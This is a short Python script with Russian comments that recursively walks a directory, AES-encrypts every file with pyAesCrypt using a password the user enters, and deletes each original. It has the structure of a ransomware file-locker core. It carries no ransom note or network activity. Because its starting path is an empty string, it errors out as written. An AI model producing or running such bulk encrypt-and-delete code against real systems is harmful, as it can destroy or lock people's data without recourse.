import pyAesCrypt
import os
# Функция шифрофания файла
def encryprion(file, password):

    # задаем размер буфера
    buffer_size = 512 * 1024

    #вызываем метод шифрования
    pyAesCrypt.encryptFile(
        str(file),
        str(file)+ ".crp",
        password,
        buffer_size
    )
    #чтобы видеть результат выводим на печать  имя зашифрованного файла
    print("[Файл '"+ str(os.path.splitext(file)[0])+ "'зашифрован]")
    #удаляем исходный файл by remove
    os.remove(file)

# Функция сканирования директории
def walking_by_dirs(dir, password):

    # перебираем все поддериктории в указанной дериктории
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # если мы нашли файл то шифруем его
        if os.path.isfile(path):
            try:
                encryprion(path, password)
            except  Exception as ex:
                print(ex)
        # если находим директорию то повторяем цикл в поисках файлов
        else:
            walking_by_dirs(path, password)

password = input("Введите пароль для шифрования:")
walking_by_dirs("", password)
